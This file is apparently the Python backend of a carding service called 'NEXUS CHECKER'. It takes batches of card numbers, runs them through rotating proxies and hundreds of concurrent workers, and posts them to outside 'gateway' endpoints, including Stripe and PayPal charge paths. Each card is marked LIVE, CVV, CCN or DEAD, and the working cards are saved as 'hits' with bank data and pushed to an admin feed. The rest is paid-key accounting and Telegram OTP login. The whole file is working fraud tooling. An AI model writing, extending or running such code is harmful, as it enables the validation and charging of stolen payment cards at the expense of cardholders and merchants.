                    wd_stop.set()
                    job["ws"]=None
                    ws_ref["w"]=None

                if batch_err["m"]:
                    if is_stripe_charge and allow_timeout_fallback and not stop_ev.is_set():
                        berr=str(batch_err["m"] or "").lower()
                        if ("gateway timeout" in berr) or ("batch timeout" in berr) or ("ws_error" in berr) or ("missing_card_payload" in berr) or ("no_proxy_warning" in berr):
                            retry_cards=[cc for cc in batch_cards if cc not in done_seen]
                            if retry_cards:
                                fb_threads=min(500,max(1,min(len(retry_cards),max(16,batch_threads//2),STRIPE_CHARGE_RETRY_THREADS)))
                                p3=_load_gateway_proxies(quick=False)
                                if p3:
                                    _run_ws_batch(retry_cards,p3,fb_threads,hold_proxy_errors,False)
                                    return
                                if not STRIPE_CHARGE_PROXY_ONLY:
                                    _fire("log",{"c":"[stripe]","s":"INFO","m":"timeout fallback direct","i":{"elapsed":0}})
                                    _run_ws_batch(retry_cards,[],max(16,fb_threads//2),hold_proxy_errors,False)
                                    return
                    for cc in batch_cards:
                        if cc not in done_seen and cc not in proxy_pending:
                            if hold_proxy_errors and _is_retryable_dead(batch_err["m"],""):
                                pend_msg="no upstream response" if is_stripe_charge else batch_err["m"]
                                pend_elapsed=round(idle_limit,1) if is_stripe_charge else 0
                                if is_paypal_charge and paypal_retry["used"]>=paypal_retry["budget"]:
                                    _emit_result(cc,"DEAD",pend_msg,"",pend_elapsed)
                                else:
                                    if is_paypal_charge:
                                        paypal_retry["used"]+=1
                                    proxy_pending[cc]=("DEAD",pend_msg,"",pend_elapsed,"","")
                                    if not is_paypal_charge:
                                        _fire("log",{"c":cc,"s":"ERROR","m":batch_err["m"],"i":{"elapsed":pend_elapsed}})
                            else:
                                dead_msg="no upstream response" if (is_stripe_charge and _is_retryable_dead(batch_err["m"],"")) else batch_err["m"]
                                dead_elapsed=round(idle_limit,1) if is_stripe_charge else 0
                                _emit_result(cc,"DEAD",dead_msg,"",dead_elapsed)

            th_cap,retry_cap,direct_cap,threads_per_proxy,min_first,min_retry=_gateway_thread_profile()
            if is_stripe_charge:
                if proxies:
                    # Match cc_checker style for Stripe 1$: fixed cap by card count, not proxy-multiplier bursts.
                    first_threads=min(500,max(1,min(len(uniq),th_cap)))
                else:
                    first_threads=min(500,max(1,min(len(uniq),min(th_cap,direct_cap))))
            else:
                if proxies:
                    first_threads=min(500,max(1,min(len(uniq),th_cap,max(min_first,len(proxies)*threads_per_proxy))))
                else:
                    first_threads=min(500,max(1,min(len(uniq),min(th_cap,direct_cap))))
            # silent start
            allow_no_proxy_retry=RAINBOW_RETRY_NO_PROXY and not proxy_only
            hold_first=bool(proxies and (allow_no_proxy_retry or RAINBOW_RETRY_WITH_PROXY))
            if is_stripe_charge:
                # Single-pass start like cc_checker to avoid delayed multi-phase launch.
                _run_ws_batch(uniq,proxies,first_threads,hold_first)
            else:
                run_cards=list(uniq)
                if not stop_ev.is_set() and run_cards:
                    _run_ws_batch(run_cards,proxies,first_threads,hold_first)

            def _cap_retry_threads(cnt):
                rt=min(500,max(1,min(cnt,retry_cap)))
                if proxies:
                    rt=min(rt,max(min_retry,len(proxies)))
                else:
                    rt=min(rt,max(min_retry,direct_cap//2))
                return rt

            proxy_retry_passes=max(1,RAINBOW_PROXY_RETRY_PASSES)
            if is_paypal_charge:proxy_retry_passes=max(proxy_retry_passes,PAYPAL_PROXY_RETRY_PASSES)
            if is_stripe_charge:proxy_retry_passes=max(proxy_retry_passes,STRIPE_CHARGE_PROXY_RETRY_PASSES)

            if hold_first and not stop_ev.is_set() and RAINBOW_RETRY_WITH_PROXY:
                for _rp in range(proxy_retry_passes):
                    retry_cards=[cc for cc in uniq if cc in proxy_pending and cc not in done_seen]
                    if not retry_cards:break
                    if is_stripe_charge:
                        _fire("log",{"c":"[stripe]","s":"INFO","m":"proxy retry pass {}/{} for {} cards".format(_rp+1,proxy_retry_passes,len(retry_cards)),"i":{"elapsed":0}})
                    retry_backup={cc:proxy_pending.get(cc) for cc in retry_cards}
                    for cc in retry_cards:proxy_pending.pop(cc,None)
                    retry_threads=_cap_retry_threads(len(retry_cards))
                    p2=_load_gateway_proxies(quick=False)
                    if not p2:
                        p2=list(proxies)
                        if p2:random.shuffle(p2)
                    _run_ws_batch(retry_cards,p2,retry_threads,hold_first)
                    for cc in retry_cards:
                        if cc not in done_seen and cc in retry_backup and retry_backup[cc]:
                            proxy_pending[cc]=retry_backup[cc]

            if hold_first and not stop_ev.is_set() and allow_no_proxy_retry:
                retry_cards=[cc for cc in uniq if cc in proxy_pending and cc not in done_seen]
                if retry_cards:
                    retry_backup={cc:proxy_pending.get(cc) for cc in retry_cards}
                    for cc in retry_cards:proxy_pending.pop(cc,None)
                    retry_threads=_cap_retry_threads(len(retry_cards))
                    _run_ws_batch(retry_cards,[],retry_threads,False)
                    for cc in retry_cards:
                        if cc not in done_seen and cc in retry_backup and retry_backup[cc]:
                            proxy_pending[cc]=retry_backup[cc]

            if is_stripe_charge and hold_first and not stop_ev.is_set():
                final_cards=[cc for cc in uniq if cc in proxy_pending and cc not in done_seen]
                if final_cards:
                    final_backup={cc:proxy_pending.get(cc) for cc in final_cards}
                    for cc in final_cards:proxy_pending.pop(cc,None)
                    final_threads=min(24,max(12,_cap_retry_threads(len(final_cards))))
                    p4=_load_gateway_proxies(quick=False)
                    if not p4:
                        p4=list(proxies)
                        if p4:random.shuffle(p4)
                    _fire("log",{"c":"[stripe]","s":"INFO","m":"final low-thread sweep {} cards @ {} threads".format(len(final_cards),final_threads),"i":{"elapsed":0}})
                    _run_ws_batch(final_cards,p4,final_threads,True,False)
                    for cc in final_cards:
                        if cc not in done_seen and cc in final_backup and final_backup[cc]:
                            proxy_pending[cc]=final_backup[cc]

            for cc in list(proxy_pending.keys()):
                if cc not in done_seen:
                    pv=proxy_pending.get(cc)
                    if isinstance(pv,(tuple,list)) and len(pv)>=6:
                        st,ms,bi,el,rawp,htm=pv[0],pv[1],pv[2],pv[3],pv[4],pv[5]
                        _emit_result(cc,st,ms,bi,el,rawp,htm)
                    else:
                        _emit_result(cc,"DEAD","retry_failed","",0)

            _complete_missing("closed")
            _finish_job()
            return

        SEP=chr(187)
        MAX_TRIES=max(1,int(os.getenv("MAX_TRIES","2")))
        DECLINE_RECHECKS=max(0,int(os.getenv("DECLINE_RECHECKS","1")))
        IS_STRIPE_AUTH=(gateway_cfg.get("backend","")=="api/api_stripe_3v1.php")
        gw_backend=quote(gateway_cfg["backend"],safe="")
        gw_name=quote(gateway_cfg["gateway"],safe="")
        gw_api=quote(gateway_cfg["api"],safe="")

        async def process_card(sess,cc,tries,rechecks_left,queue):
            """Returns True if card was requeued for retry, False if done."""
            nonlocal expired_mode
            nonlocal key_remaining
            is_stripe_auth=IS_STRIPE_AUTH
            max_tries=2 if is_stripe_auth else MAX_TRIES
            check_attempts=2 if is_stripe_auth else 2
            check_retry_delay=0.1 if is_stripe_auth else 0.2
            enc_timeout=_STRIPE_AUTH_ENC_TIMEOUT if is_stripe_auth else _ENC_TIMEOUT
            chk_timeout=_STRIPE_AUTH_CHK_TIMEOUT if is_stripe_auth else _CHK_TIMEOUT
            if stop_ev.is_set():
                if expired_mode:
                    counts["ck"]+=1;counts["dd"]+=1
                    _fire("r",{"c":cc,"s":"DEAD","m":"plan_expired","i":_dead_info(0)})
                return False
            if (time.time()-job_start)>=key_remaining:
                stop_ev.set();expired_mode=True
                counts["ck"]+=1;counts["dd"]+=1
                _fire("r",{"c":cc,"s":"DEAD","m":"plan_expired","i":_dead_info(0)})
                return False
            t0=time.time()
            b6=cc.split("|")[0][:6]
            info={"brand":"?","type":"?","level":"?","bank":"?","country":"?","elapsed":0}
            if b6 in bin_cache:
                cached=bin_cache.get(b6)
                if cached:
                    for bk in("brand","type","level","bank","country"):info[bk]=cached[bk]
            # Phase 1: Encrypt
            tk=None
            enc_data="lista="+encoded[cc]+"&api_url="+gw_backend+"&gateway_name="+gw_name+"&api_name="+gw_api
            try:
                async with sess.post("https://core.ayanochk.vip/ayanoencrypt.php",
                    data=enc_data,timeout=enc_timeout,ssl=_NOSSL) as r1:
                    raw=(await r1.read()).decode().strip()
                    if raw and len(raw)>=10 and '<' not in raw[:30] and not any(w in raw.lower()[:80] for w in ("cloudflare","captcha","forbidden","access denied","just a moment","attention required")):
                        tk=raw
            except asyncio.CancelledError:return False
            except Exception:tk=None
            if not tk:
                if tries<max_tries:
                    queue.put_nowait((cc,tries+1,rechecks_left));return True
                info["elapsed"]=round(time.time()-t0,1);counts["ck"]+=1;counts["dd"]+=1
                _fire("r",{"c":cc,"s":"DEAD","m":"enc_fail","i":info});return False
            if stop_ev.is_set():return False
            # Phase 2: Check (2 attempts with same token, no re-encrypt cost)
            chk_data="data="+quote(tk,safe="")+"&api_url="+gw_backend+"&gateway_name="+gw_name+"&api_name="+gw_api
            body=None
            for _ca in range(check_attempts):
                if stop_ev.is_set():return False
                if _ca>0:await asyncio.sleep(check_retry_delay)
                try:
                    async with sess.post("https://coreapi.ayanochk.vip/ayanocoreauth.php",
                        data=chk_data,timeout=chk_timeout,ssl=_NOSSL) as r2:
                        raw2=(await r2.read()).decode().strip()
                    if not raw2:continue
                    bl=raw2.lower()[:120]
                    if any(w in bl for w in ("cloudflare","captcha","forbidden","access denied","just a moment","attention required")):continue
                    body=raw2;break
                except asyncio.CancelledError:return False
                except Exception:continue
            if not body:
                if tries<max_tries:
                    queue.put_nowait((cc,tries+1,rechecks_left));return True
                info["elapsed"]=round(time.time()-t0,1);counts["ck"]+=1;counts["dd"]+=1
                _fire("r",{"c":cc,"s":"DEAD","m":"chk_fail","i":info});return False
            if stop_ev.is_set():return False
            el=round(time.time()-t0,1);info["elapsed"]=el
            cl=_HTML_RE.sub("",body);pts=[p.strip() for p in cl.split(SEP)]
            st=pts[0].upper()if pts else""
            low=cl.lower()
            known=("APPROVED","CHARGED","CVV","CCN","3DS","DECLINED")
            if len(pts)<2 and not any(k in st for k in known):
                if tries<max_tries:
                    queue.put_nowait((cc,tries+1,rechecks_left));return True
                counts["ck"]+=1;counts["dd"]+=1
                snip=re.sub(r"\s+"," ",cl).strip()[:80]
                _fire("r",{"c":cc,"s":"DEAD","m":"upstream_busy"+(":"+snip if snip else""),"i":info});return False
            m=""
            for p in pts[2:]:
                if p.count("|")>=3 and "SITE" not in p:
                    bp=[b.strip() for b in p.split("|")]
                    info["brand"]=bp[0]if bp else"?"
                    info["type"]=bp[1]if len(bp)>1 else"?"
                    info["level"]=bp[2]if len(bp)>2 else"?"
                    info["bank"]=bp[3]if len(bp)>3 else"?"
                    info["country"]=bp[4]if len(bp)>4 else"?"
                    bin_cache[b6]=dict(info)
                    if len(bin_cache)>_BIN_CACHE_MAX:
                        try:bin_cache.popitem(last=False)
                        except Exception:pass
                    break
            if len(pts)>2:
                m=pts[2]
                if "seti_" in m:m="succeeded"
            if not m:
                if "DECLINED" in st:m="declined"
                elif "CVV" in st:m="cvv"
                elif "CCN" in st:m="ccn"
            if info["brand"]=="?" and b6 in bin_cache:
                cached=bin_cache.get(b6)
                if cached:
                    for k in("brand","type","level","bank","country"):info[k]=cached[k]
            if "APPROVED" in st or "CHARGED" in st:status="LIVE"
            elif "CVV" in st:status="CVV"
            elif "CCN" in st:status="CCN"
            elif "3DS" in st:status="3DS"
            else:status="DEAD"
            if status=="DEAD" and rechecks_left>0:
                queue.put_nowait((cc,1,rechecks_left-1));return True
            counts["ck"]+=1
            if status in("CVV","LIVE"):counts["cv"]+=1
            elif status=="CCN":counts["cn"]+=1
            else:counts["dd"]+=1
            if status in("CVV","LIVE","CCN"):
                hit={"cc":cc,"status":status,"brand":info.get("brand","?"),"bank":info.get("bank","?"),"country":info.get("country","?"),"key":ukey,"time":time.time()}
                with _data_lock:
                    d=load_data();d.setdefault("hits",[]).append(hit);save_data(d)
                _fire("admin_hit",hit,"admin_room")
            _fire("r",{"c":cc,"s":status,"m":m,"i":info})
            return False

        async def run_async():
            loop=asyncio.get_event_loop()
            job["loop"]=loop
            is_stripe_auth=IS_STRIPE_AUTH
            if is_stripe_auth:
                base_limit=STRIPE_AUTH_HARD_THREADS
                target_per_session=STRIPE_AUTH_TARGET_PER_SESSION
                conn_scale=STRIPE_AUTH_CONNECTOR_LIMIT_SCALE
                max_per_host=STRIPE_AUTH_MAX_PER_HOST
            else:
                with _jobs_lock:base_limit=min(WORKERS//max(len(user_jobs),1),MAX_PER_USER)
                target_per_session=TARGET_PER_SESSION
                conn_scale=CONNECTOR_LIMIT_SCALE
                max_per_host=MAX_PER_HOST
            n_acc=len(_ACCOUNTS)
            proxy_only=FORCE_PROXY_ONLY and not is_stripe_auth
            proxy_urls=[]
            proxy_rows=[]
            if is_stripe_auth and USE_PROXIES:
                proxy_rows=[p for p in _PROXIES if isinstance(p,str) and p.count(":")>=3]
                if not proxy_rows:
                    proxy_rows=_fetch_rainbow_proxies()
                if proxy_rows:
                    random.shuffle(proxy_rows)
                    proxy_rows=proxy_rows[:STRIPE_AUTH_PROXY_LIMIT]
            elif (not is_stripe_auth) and (FORCE_MAIN_SOURCE_PROXIES or USE_PROXIES):
                proxy_rows=_get_proxy_rows(require_main=FORCE_MAIN_SOURCE_PROXIES)
            for px in proxy_rows:
                parts=px.split(":",3)
                if len(parts)==4:
                    proxy_urls.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")

            if proxy_only and not proxy_urls:
                for cc in uniq:
                    counts["ck"]+=1;counts["dd"]+=1
                    _fire("r",{"c":cc,"s":"DEAD","m":"main_proxy_source_empty (refresh rainbow session)","i":_dead_info(0)})
                return

            async def _probe_proxy(pu):
                p_to=aiohttp.ClientTimeout(total=PROXY_PROBE_TIMEOUT,sock_connect=min(PROXY_PROBE_TIMEOUT,4),sock_read=max(2,PROXY_PROBE_TIMEOUT-2))
                data="lista="+quote(PROXY_TEST_CC)
                hdr=_ACCOUNTS[0] if _ACCOUNTS else {"User-Agent":_UA,"Content-Type":"application/x-www-form-urlencoded"}
                for _ in range(PROXY_PROBE_TRIES):
                    try:
                        async with aiohttp.ClientSession(headers=hdr,trust_env=False) as ps:
                            async with ps.post("https://core.ayanochk.vip/ayanoencrypt.php",
                                data=data,timeout=p_to,ssl=_NOSSL,proxy=pu) as pr:
                                out=(await pr.read()).decode().strip()
                                if pr.status==200 and out and len(out)>=10 and "<" not in out:return True
                    except Exception:
                        pass
                return False

            do_pref=(STRIPE_AUTH_PROXY_PREFLIGHT if is_stripe_auth else PROXY_PREFLIGHT)
            if is_stripe_auth:do_pref=False
            if proxy_urls and do_pref:
                okp=await asyncio.gather(*[_probe_proxy(pu) for pu in proxy_urls],return_exceptions=False)
                before=len(proxy_urls)
                proxy_urls=[pu for pu,ok in zip(proxy_urls,okp) if ok]
                if before!=len(proxy_urls):
                    try:print(f"[proxy] active {len(proxy_urls)}/{before} (failed removed)",flush=True)
                    except Exception:pass

            if is_stripe_auth and not proxy_urls:
                base_limit=min(base_limit,STRIPE_AUTH_DIRECT_THREADS)

            conn_limit=max(1,base_limit,int(base_limit*conn_scale))
            per_host=max(1,min(conn_limit,max_per_host))
            conn=aiohttp.TCPConnector(limit=conn_limit,limit_per_host=per_host,ttl_dns_cache=3600,
                enable_cleanup_closed=True,keepalive_timeout=30,force_close=False)

            sessions=[]
            for i in range(n_acc):
                if proxy_urls:
                    for pidx,pu in enumerate(proxy_urls,1):
                        sess=aiohttp.ClientSession(headers=_ACCOUNTS[i],connector=conn,connector_owner=False,proxy=pu)
                        sessions.append({"s":sess,"f":0,"u":0.0})
                    if DIRECT_FALLBACK and not proxy_only:
                        for didx in range(DIRECT_SESSION_MULT):
                            sess=aiohttp.ClientSession(headers=_ACCOUNTS[i],connector=conn,connector_owner=False)
                            sessions.append({"s":sess,"f":0,"u":0.0})
                else:
                    sess=aiohttp.ClientSession(headers=_ACCOUNTS[i],connector=conn,connector_owner=False)
                    sessions.append({"s":sess,"f":0,"u":0.0})
            total_sessions=len(sessions)
            if total_sessions<1:return
            if is_stripe_auth:
                limit=max(1,base_limit)
            else:
                limit=max(1,min(base_limit,total_sessions*target_per_session))
            try:print(f"[*] workers {limit}/{base_limit} | sessions {total_sessions}",flush=True)
            except Exception:pass
            _fire("log",{"c":"","s":"INFO","m":f"Loading {len(uniq)} cards...","i":{"elapsed":0}})

            queue=asyncio.Queue()
            _decline_rechecks=0 if is_stripe_auth else DECLINE_RECHECKS
            for cc in uniq:queue.put_nowait((cc,1,_decline_rechecks))

            async def next_session():
                if is_stripe_auth:
                    return sessions[random.randrange(total_sessions)]
                now=time.time()
                alive=[ln for ln in sessions if ln["u"]<=now]
                if alive:
                    a=alive[random.randrange(len(alive))]
                    b=alive[random.randrange(len(alive))]
                    return a if a["f"]<=b["f"] else b
                best=min(sessions,key=lambda x:x["u"])
                if best["u"]>now:
                    await asyncio.sleep(min(0.2,best["u"]-now))
                return best

            async def worker(wid):
                while True:
                    try:
                        item=await queue.get()
                        if isinstance(item,(tuple,list)) and len(item)>=3:cc,tries,rechecks_left=item[0],item[1],item[2]
                        else:cc,tries,rechecks_left=item[0],item[1],DECLINE_RECHECKS
                    except asyncio.CancelledError:break
                    try:
                        ln=await next_session()
                        retried=await process_card(ln["s"],cc,tries,rechecks_left,queue)
                        if retried and COOL_ON_TIMEOUT and not is_stripe_auth:
                            if ln["f"]<10:ln["f"]+=1
                            if ln["f"]>=LANE_FAIL_TRIGGER:
                                cool=LANE_COOLDOWN_BASE*(2**(ln["f"]-LANE_FAIL_TRIGGER))
                                ln["u"]=time.time()+min(LANE_COOLDOWN_MAX,cool)
                        elif not retried and ln["f"]>0 and not is_stripe_auth:
                            ln["f"]-=1
                            if ln["f"]==0:ln["u"]=0.0
                    except asyncio.CancelledError:
                        queue.put_nowait((cc,tries,rechecks_left));break
                    except Exception:
                        import traceback; traceback.print_exc()
                    finally:queue.task_done()
            workers=[]
            try:
                workers=[asyncio.create_task(worker(i)) for i in range(limit)]
                job["tasks"]=workers
                await queue.join()
            finally:
                stop_ev.set()
                for w in workers:
                    if not w.done():w.cancel()
                await asyncio.gather(*workers,return_exceptions=True)
                for ln in sessions:
                    try:await ln["s"].close()
                    except Exception:pass
                await conn.close()

        try:asyncio.run(run_async())
        except Exception:pass
        elapsed=time.time()-job_start
        d=load_data();d["stats"]["checked"]+=counts["ck"]
        d["stats"]["cvv"]=d["stats"].get("cvv",0)+counts["cv"]
        d["stats"]["ccn"]=d["stats"].get("ccn",0)+counts["cn"]
        d["stats"]["charged"]=d["stats"].get("charged",0)+counts.get("ch",0)
        d["stats"]["dead"]+=counts["dd"]
        if ukey!="admin" and ukey in d["keys"]:
            d["keys"][ukey]["used_time"]=d["keys"][ukey].get("used_time",0)+elapsed
            d["keys"][ukey].pop("check_start",None)
        save_data(d)
        sio.emit("done",room=room)
        active_jobs.pop(job_id,None)
        if user_jobs.get(tok)==job_id:user_jobs.pop(tok,None)

    threading.Thread(target=run,daemon=True).start()
    return jsonify({"j":job_id,"g":gw_id,"gl":gateway_cfg["label"],"th":req_th})

@app.route(_API_PREFIX+"/s",methods=["POST"])
def api_stop():
    jdata=request.json or {}
    tok=jdata.get("t","")
    if not tok or tok!=session.get("_t"):return jsonify({}),403
    jid=jdata.get("j","")
    if jid:kill_job(jid)
    kill_user_job(tok)
    return jsonify({})

@app.route("/bot/send-otp",methods=["POST"])
def bot_send_otp():
    uid=request.form.get("uid","").strip()
    if not uid or not uid.isdigit():return jsonify({"error":"Enter your Telegram ID"}),400
    code="".join(random.choices(string.digits,k=6))
    with _otp_lock:_otp_store[uid]={"code":code,"expires":time.time()+300}
    msg=f'<b>OTP CODE:</b> <code>{code}</code>'
    try:
        urllib.request.urlopen(urllib.request.Request(
            f'https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage',
            data=json.dumps({"chat_id":int(uid),"text":msg,"parse_mode":"HTML"}).encode(),
            headers={"Content-Type":"application/json"}),timeout=10)
        return jsonify({"ok":True,"msg":"OTP sent to your Telegram"})
    except Exception as e:
        return jsonify({"error":f"Could not send OTP. Message @nexusccorbot first with /start"}),400

@app.route("/bot/verify-otp",methods=["POST"])
def bot_verify_otp():
    uid=request.form.get("uid","").strip()
    code=request.form.get("code","").strip()
    if not uid or not code:return jsonify({"error":"missing"}),400
    with _otp_lock:
        otp=_otp_store.get(uid)
        if not otp or otp["expires"]<time.time():return jsonify({"error":"OTP expired"}),400
        if otp["code"]!=code:return jsonify({"error":"Invalid code"}),400
        del _otp_store[uid]
    db=load_data();db.setdefault("users",{})
    if uid not in db["users"]:
        tuname="user_"+uid[:8];tfirst="User"
        try:
            import urllib.request as _ur2
            r=_ur2.urlopen(f'https://api.telegram.org/bot{TG_BOT_TOKEN}/getChat?chat_id={uid}',timeout=8)
            chat=json.loads(r.read()).get("result",{})
            tuname=chat.get("username",tuname);tfirst=chat.get("first_name",tfirst)
        except:pass
        db["users"][uid]={"username":tuname,"first_name":tfirst,"credits":20,"used_credits":0,"duration":99999999,"used_time":0,"used":True,"created":time.time(),"ip":request.remote_addr,"last_seen":time.time()}
    else:
        db["users"][uid]["ip"]=request.remote_addr
        db["users"][uid]["last_seen"]=time.time()
    save_data(db)
    session["tuid"]=uid;session["tuname"]=db["users"][uid].get("username","")
    tok=uuid.uuid4().hex
    db["users"][uid]["active_session"]=tok;session["_ks"]=tok;save_data(db)
    return jsonify({"ok":True,"redirect":"/checker"})

if __name__=="__main__":
    load_data()
    threading.Thread(target=_bg_saver,daemon=True).start()
    print(f"[*] NEXUS CHECKER | {WORKERS} workers")
    print(f"[+] http://0.0.0.0:5000")
    print(f"[+] Admin panel: /admin/login")
    import atexit;atexit.register(_save_to_disk)
    sio.run(app,host="0.0.0.0",port=5000,debug=False,allow_unsafe_werkzeug=True)
